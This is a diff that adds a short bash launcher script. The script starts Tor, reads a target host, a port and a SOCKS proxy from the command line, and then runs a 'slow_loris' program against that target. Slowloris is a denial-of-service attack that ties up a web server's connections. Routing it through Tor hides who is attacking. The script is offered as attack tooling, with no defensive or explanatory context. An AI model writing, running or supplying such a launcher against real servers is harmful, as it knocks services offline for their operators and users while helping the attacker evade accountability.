@@ -1,0 +1,18 @@
+#!/bin/bash
+
+# Run tor
+sudo service tor start
+
+# Get arguments from command line
+while getopts t:p:s: option
+do
+	case "${option}"
+		in
+		t) TARGET=${OPTARG};;
+		p) PORT=${OPTARG};;
+		s) SOCKS=${OPTARG};;
+	esac
+done
+
+# Run slow loris C program
+sudo ./slow_loris ${TARGET} ${PORT} ${SOCKS}
